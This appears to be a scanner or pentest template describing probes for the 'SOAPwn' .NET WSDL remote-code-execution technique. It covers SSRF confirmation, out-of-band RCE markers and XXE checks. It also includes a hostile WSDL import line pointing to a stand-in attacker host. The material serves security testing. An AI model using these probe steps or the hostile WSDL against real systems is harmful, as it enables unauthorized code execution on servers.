description: SOAPwn (.NET SOAP client + WSDL RCE — Bazydlo / watchTowr — PortSwigger Top 10 / 2025, #5). When a .NET application acts as a SOAP client and the WSDL endpoint is attacker-controlled (URL parameter, header, configuration), serving a hostile WSDL triggers .NET XmlSerializer code-gen + dynamic compilation. Reaching XSD imports and complex type definitions, attacker achieves arbitrary code execution in the SOAP-client context.

wsdl_url_user_controlled.description: Endpoint accepts a WSDL URL from the user (wsdl, service_url, endpoint, soap_endpoint, callback_wsdl). .NET application loads it via System.Web.Services.Description.ServiceDescription.Read or similar. Hostile WSDL with crafted XSD chain triggers code-gen.

probes.description: Submit attacker WSDL URL via parameter. Confirm SSRF — server fetches the WSDL from Collaborator. Pre-step for RCE: once fetch confirmed, serve hostile WSDL+XSD chain.

variables.note: After confirming fetch, host hostile WSDL: <wsdl:import location='http://attacker/evil.xsd'/> with complexType chain exploiting .NET XmlSerializer codegen path.

probes.description: Verify hostile WSDL + XSD import + complexType triggers .NET compile pipeline. RCE marker: out-of-band DNS / HTTP from server-side compilation context (csc.exe spawn).

soap_action_xxe_chain.description: SOAP endpoint with SOAPAction header — .NET WCF or legacy ASMX. Combined with hostile WSDL, the SOAPAction routing may trigger different deserialisation paths exposing XXE / RCE primitives.

probes.description: XXE via SOAP body — confirm .NET parser resolves external entities (legacy permissive XmlReaderSettings).
